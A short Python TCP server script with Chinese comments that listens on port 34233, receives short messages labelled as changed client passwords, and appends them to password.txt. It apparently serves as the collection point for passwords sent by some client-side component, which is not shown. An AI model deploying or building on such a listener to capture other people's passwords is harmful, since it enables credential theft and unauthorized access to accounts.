import socket

while True:
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind(('0.0.0.0',34233)) #修改成监听的端口及ip
    server.listen(5)
    print('staring...')
    conn,addr = server.accept()
    try:
        conn.settimeout(5)
        while True:
            print(conn)
            #print('clint addr', addr)
            print('ready to recv the password...')
            client_msg = conn.recv(30)
            print('client password changed: %s' % client_msg)
            try:
                with open('password.txt','a') as f:
                    f.write(client_msg.decode('utf-8'))
                    f.write('\n')
                    conn.send(client_msg.upper())
            except UnicodeDecodeError:
                print('错误信息，跳过！')
            break
    except socket.timeout:
        print('time out')
                
    conn.close()
    server.close()
